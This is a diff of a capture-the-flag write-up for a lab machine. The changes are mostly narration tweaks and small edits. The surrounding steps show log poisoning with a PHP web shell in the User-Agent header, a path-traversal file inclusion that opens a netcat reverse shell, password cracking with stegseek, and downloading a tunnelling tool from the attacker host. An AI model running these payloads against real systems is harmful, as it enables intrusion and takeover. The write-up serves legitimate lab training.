@@ -247,7 +247,7 @@ Let's apply steganographic analysis to `prometheus.jpg`:
 ```
 $ stegseek prometheus.jpg /usr/share/wordlists/rockyou.txt
 ...
-i] Found passphrase: "soldierofanubis"
+[i] Found passphrase: "soldierofanubis"
 [i] Original filename: "secret.txt".
 [i] Extracting to "prometheus_message.txt".
 ```
@@ -265,6 +265,8 @@ Ok, now that we have a new domain, we append it to our `/etc/hosts`:
 $ echo "10.0.0.2 thetruthoftalos.hmv" | sudo tee -a /etc/hosts
 10.0.0.2 thetruthoftalos.hmv
 ```
+
+If we browse to `thetruthoftalos.hmv` we will found nothing (literally):
 
 ![thetruthoftalos.hmv index.html](hmv-principle2-thetruthoftalos-hmv-index-html.png)
 *thetruthoftalos.hmv index.html*
@@ -331,6 +333,8 @@ We start a listener on our host:
 $ nc -lvnp 12345
 ```
 
+Now, we poison the log and we try to get a reverse shell:
+
 ```
 $ curl -i -v http://thetruthoftalos.hmv/index.php -A "<?php system(\$_REQUEST['cmd']);?>"
 $ curl -i -v "http://thetruthoftalos.hmv/index.php?filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F%2Fvar%2Flog%2Fnginx%2Faccess.log&cmd=nc%20-e%20/bin/sh%2010.0.1%2012345"
@@ -369,6 +373,8 @@ We have Hermanubis' password for SMB, so let's see if he has the same password f
 $ su hermanubis
 Password: ByronIsAsshole
 ```
+
+Ok, it worked:
 
 ```
 $ id
@@ -454,7 +460,7 @@ $ python -m http.server 443
 And, in [Principle 2][2], we download the chisel bynary from our host:
 
 ```
-$ wget http://192.168.1.21:443/chisel_1.9.1_linux_amd64
+$ wget http://10.0.0.1:443/chisel_1.9.1_linux_amd64
 $ mv chisel_1.9.1_linux_amd64 chisel
 $ chmod 700 chisel
 ```
@@ -485,6 +491,8 @@ $ cat /tmp/melville_password.txt
 ```
 
 # Melville
+
+We connect as Melville using ssh:
 
 ```
 $ ssh -p 22222 melville@localhost
@@ -537,7 +545,7 @@ $ ls -la /usr/local/share/report
 
 ```
 $ cat /opt/users.txt
-melville pts/0        2023-12-14 00:00 (10.0.0.1)
+melville pts/0        2023-12-18 00:00 (10.0.0.1)
 ```
 
 And, after investigating the other binaries, we find that `/usr/bin/updater` it's only a script which upgrades the system, while `/usr/local/share/report` is the script used to write the logins (the output of the `who` command) in `/opt/users.txt`.
